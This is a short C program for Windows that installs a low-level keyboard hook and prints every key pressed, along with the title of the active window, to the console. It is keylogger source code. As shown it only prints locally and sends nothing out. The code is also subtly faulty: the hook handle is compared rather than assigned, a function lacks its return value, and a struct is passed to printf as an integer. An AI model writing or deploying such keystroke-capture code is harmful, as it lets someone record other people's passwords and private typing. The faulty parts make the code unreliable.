#include <stdio.h>
#include <windows.h>

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

int KeyInputPrint(int keystroke)
{
    HWND foreground = GetForegroundWindow();
    char window_title[256];
    GetWindowTextA(foreground, (LPSTR)window_title, 256);

    printf("%s::%c (%d)", window_title, keystroke, keystroke);
    //MapVirtualKeyExA();//check simultaneously pressed keys
    //GetKeyState(VK_SHIFT);
}   

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if(nCode >= 0)
    {
        if(wParam == WM_KEYDOWN)
        {
            kbdStruct = *((KBDLLHOOKSTRUCT *)lParam);
            KeyInputPrint(kbdStruct.vkCode);
            printf("%d\n",kbdStruct);
        }
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if(!(_hook == SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, NULL)))
    {
        MessageBox(NULL, L"Faild to install hook", L"Error", MB_ICONERROR);
    }
}

int main()
{
    printf("Hook Start\n");
    SetHook();
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {

    }

    UnhookWindowsHookEx(_hook);
}